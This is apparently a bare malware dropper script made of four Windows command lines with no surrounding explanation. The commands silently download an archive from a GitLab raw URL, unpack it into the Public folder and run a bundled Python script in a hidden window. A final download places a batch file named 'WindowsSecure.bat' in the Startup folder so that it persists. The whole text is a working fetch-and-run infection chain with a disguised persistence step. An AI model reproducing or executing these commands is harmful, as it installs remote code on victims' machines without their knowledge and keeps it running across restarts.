powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://gitlab.com/anhducratsilver/2dau/-/raw/main/A.zip', 'C:\Users\Public\Documents.zip')"
powershell.exe -WindowStyle Hidden -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:/Users/Public/Documents.zip', 'C:/Users/Public/Documents')"
powershell.exe -WindowStyle Hidden -Command " C:\Users\Public\Documents\Scripts\python.exe C:\Users\Public\Documents\host.py"
cmd/c powershell.exe "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://gitlab.com/anhducratsilver/2dau/-/raw/main/start1', '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsSecure.bat')"
